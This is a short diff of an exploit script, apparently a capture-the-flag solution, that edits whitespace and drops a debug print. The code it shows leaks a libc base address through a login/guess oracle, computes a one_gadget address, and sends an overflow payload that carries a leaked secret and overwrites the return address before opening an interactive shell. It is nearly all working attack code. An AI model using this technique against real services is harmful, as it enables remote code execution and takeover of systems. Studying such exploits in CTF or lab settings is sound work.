@@ -41,17 +41,9 @@ login('\x00' + 'a'*0x57)
 copy('a'*40)
 logout()
 base = u64(guess(6, 'a'*16 + '1' + 'a'*7)[24:] + '\x00\x00') - 324 - libc.symbols['setvbuf']
-
 one_gadget = base + one_offset
-
-payload = '\x00'+'a'*63 + secret + 'a'*24 + p64(one_gadget)
-
+payload = '\x00' + 'a'*63 + secret + 'a'*24 + p64(one_gadget)
 login(payload)
-
 copy('a'*0x30)
-
 Exit()
-
-print(hex(base))
-
 server.interactive()
